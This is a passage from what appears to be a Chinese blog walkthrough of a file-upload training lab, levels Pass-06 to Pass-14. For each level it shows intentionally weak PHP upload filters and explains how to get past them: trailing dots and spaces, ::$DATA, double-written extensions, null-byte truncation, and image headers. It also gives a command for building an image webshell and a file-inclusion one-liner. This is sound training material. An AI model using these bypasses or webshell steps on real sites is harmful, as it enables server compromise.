class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v6">绕过方式</h4>
<p>相比前几题，大小写绕过和上传.htaccess文件已经行不通了，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p>
<blockquote>
<p>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点。</p>
</blockquote>
<p>在此处代码过滤了<code>.</code>和<code>::$DATA</code>，但是没有去掉末尾的空格，因此上传一个.php[空格]文件即可。</p>
<h5 id="空格绕过">空格绕过</h5>
<p>修改文件后缀为<code>1.php .</code>这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和达到上传.php的目的。</p>
<h3 id="Pass-07-利用-绕过">Pass-07 利用.绕过</h3>
<h4 id="代码-v7">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v7">绕过方式</h4>
<h5 id="点绕过">点绕过</h5>
<p>从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p>
<p>用burp将上传文件后缀改为.php.即可，详细原理与Pass-06类似。</p>
<h3 id="Pass-08-利用-DATA-绕过（Windows环境）">Pass-08 利用$DATA::绕过（Windows环境）</h3>
<h4 id="代码-v8">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v8">绕过方式</h4>
<h5 id="DATA绕过">::$DATA绕过</h5>
<p>相比上面两道题，少了去除文件名的&quot;::$DATA&quot;字符串这一步，这里还是利用windows的一个特性。</p>
<blockquote>
<p>在php+windows的情况下：如果文件名+&quot;::$DATA&quot;会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持&quot;::$DATA&quot;之前的文件名。</p>
</blockquote>
<p>用Burp将上传文件后缀改为:<code>xx.php::$DATA</code>即可。</p>
<h3 id="Pass-09-利用-空格-绕过">Pass-09 利用.+空格+.绕过</h3>
<h4 id="代码-v9">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v9">绕过方式</h4>
<h5 id="点-空格-点绕过">点+空格+点绕过</h5>
<p>它去除了文件名末尾的点，去除了文件名尾空格，还去除了::$DATA，但是从“双写”的思想出发，代码的逻辑是先删除文件名末尾的点，再去除字符串::$DATA，最后首尾去空，所以我们可以使用点+空格+点的方式绕过。</p>
<p>也就是说，用Burp将文件名改为<code>xx.php. .</code>。</p>
<blockquote>
<p>也就是说，如果从第三关到第九关，如果目标服务器是windows系统的话，均可用点空格点绕过。</p>
</blockquote>
<h3 id="Pass-10-利用双写绕过">Pass-10 利用双写绕过</h3>
<h4 id="代码-v10">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">&quot;&quot;</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v10">绕过方式</h4>
<h5 id="双写绕过">双写绕过</h5>
<p>先分析下代码，可以看到问题出现在第8行的<code>str_ireplace()</code>函数，此函数在此的作用是对<code>$file_name</code>变量中含有<code>$deny_ext</code>内容的部分替换为空，但是此操作只执行一次。“只执行一次”就是问题所在，如果我们上传类似<code>test.pphphp</code>这样的文件，上传后文件会自动被修改为<code>test.php</code>进而成功上传shell。</p>
<h3 id="Pass-11-利用-00截断绕过">Pass-11 利用%00截断绕过</h3>
<h4 id="代码-v11">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v11">绕过方式</h4>
<h5 id="00绕过">%00绕过</h5>
<p>分析代码发现最终返回的图片链接是“存储路径名+重命名后的文件名”，看到这个我们就可以联想到使用%00截断路径。</p>
<blockquote>
<p>截断条件：<br>
1、php版本小于5.3.4<br>
2、php.ini的magic_quotes_gpc为OFF状态</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129202250.png" alt=""></p>
<h3 id="Pass-12-利用0x00截断绕过">Pass-12 利用0x00截断绕过</h3>
<p>这里代码与上面Pass-11代码类似，不过是save_path参数由GET传入变为POST传入，利用原理也是00截断。故这里不再叙述.</p>
<h3 id="Pass-13-利用图片马绕过文件头检测">Pass-13 利用图片马绕过文件头检测</h3>
<h4 id="代码-v12">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="绕过方式-v12">绕过方式</h4>
<h5 id="GIF89a">GIF89a</h5>
<p>分析下代码，发现此处就是对文件头进行了解析，此时只需要上传图片马或者在test.php文件的开头加上GIF89a即可。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129205131.png" alt=""></p>
<p>为了检测图片马是否能正常利用，这里在upload目录中放置个文件包含文件，fileInclude.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再使用文件包含漏洞执行上传的shell：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129205956.png" alt=""></p>
<h5 id="Windows命令">Windows命令</h5>
<p>在Windows下使用如下命令可制作图片一句话木马：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用WinHex打开生成的图片马就可以看到插入的PHP代码了：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210120.png" alt=""></p>
<h5 id="手工添加文件头">手工添加文件头</h5>
<p>针对文件头的检测，我们可以手工添加各种格式文件的文件头来绕过。</p>
<p>比如图片类型的文件幻数如下：</p>
<p>JPG文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210209.png" alt=""></p>
<p>GIF文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210224.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210237.png" alt=""></p>
<p>所以我们就可以直接在Burp中拦截报文手工在Hex栏中在PHP木马代码前添加上JPG的文件头：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191129210347.png" alt=""></p>
<h3 id="Pass-14-利用图片马绕过getimagesize">Pass-14 利用图片马绕过getimagesize()</h3>
<h4 id="代码-v13">代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = 